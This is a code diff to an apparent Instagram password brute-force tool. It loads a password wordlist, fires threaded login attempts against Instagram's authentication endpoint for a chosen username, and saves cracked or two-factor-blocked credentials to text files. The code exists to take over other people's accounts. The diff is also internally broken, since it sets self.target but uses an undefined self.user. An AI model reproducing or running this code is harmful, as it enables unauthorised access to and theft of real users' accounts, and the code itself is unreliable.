@@ -7,10 +7,10 @@ import typer
 from tabulate import tabulate
 
 class default_start(object):
-    def __init__(self):
+    def __init__(self,username):
+        self.target = username
 
         try:
-            user = typer.prompt(typer.style("Enter a username",fg=typer.colors.BRIGHT_GREEN))
             Combo = "default_w.txt"
             with typer.progressbar(range(10)) as sp:
                 for i in sp:
@@ -26,7 +26,7 @@ class default_start(object):
         self.Coutprox = 0
         for combo in Combolist:
             password = combo.split(':')[0]
-            t = threading.Thread(target=self.New_Br, args=(user, password))
+            t = threading.Thread(target=self.New_Br, args=(self.user, password))
             t.start()
             thread.append(t)
             time.sleep(0.9)
@@ -45,7 +45,7 @@ class default_start(object):
         time = int(datetime.now().timestamp())
 
         payload = {
-            'username': user,
+            'username': self.user,
             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
             'queryParams': {},
             'optIntoOneTap': 'false'
@@ -61,24 +61,24 @@ class default_start(object):
                 "x-csrftoken": csrf
             })
             x_table = [
-                    [typer.style(user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Hacking...",fg=typer.colors.RED)]
+                    [typer.style(self.user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Hacking...",fg=typer.colors.RED)]
             ]
             print(tabulate(x_table,tablefmt="psql"))
 
             if 'authenticated": true' in r.text:
                 pass_table=[
-                        [typer.style(user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Hacked. Password is Helper/good.txt",fg=typer.colors.CYAN)]
+                        [typer.style(self.user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Hacked. Password is Helper/good.txt",fg=typer.colors.CYAN)]
                 ]
                 print(tabulate(pass_table,tablefmt="psql"))
                 
                 with open('good.txt', 'a') as x:
-                    x.write(user + ':' + pwd + '\n')
+                    x.write(self.user + ':' + pwd + '\n')
             elif 'two_factor_required' in r.text:
                 pass_table=[
-                        [typer.style(user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Problem. Password is Helper/results_NeedVerfiy.txt.",fg=typer.colors.CYAN)]
+                        [typer.style(self.user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Problem. Password is Helper/results_NeedVerfiy.txt.",fg=typer.colors.CYAN)]
                 ]
                 print(tabulate(pass_table,tablefmt='psql'))
                 with open('results_NeedVerfiy.txt', 'a') as x:
-                    x.write(user + ':' + pwd + '\n')
+                    x.write(self.user + ':' + pwd + '\n')
 
 
